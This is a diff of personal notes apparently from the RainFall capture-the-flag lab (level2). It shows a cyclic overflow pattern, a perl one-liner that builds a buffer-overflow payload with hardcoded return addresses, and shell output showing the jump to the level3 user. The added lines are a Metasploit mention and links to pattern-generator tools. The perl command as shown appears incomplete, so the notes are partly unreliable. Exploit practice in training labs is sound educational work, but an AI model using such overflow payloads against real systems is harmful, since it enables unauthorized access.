@@ -9,6 +9,10 @@ AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPUUUURRRRSSSSTTTT
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 
 
+metasploit
+
+https://letmegooglethat.com/?q=pattern+overflow
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/
 
 
 level2@RainFall:~$ perl -e '"a"*80+"\x4b\x85\x04\x08"+"\xaa\xfe\xff\xbf"' > input.txt        
@@ -18,3 +22,4 @@ whoami
 level3
 (0xbdbfefbd)
 whoami
+
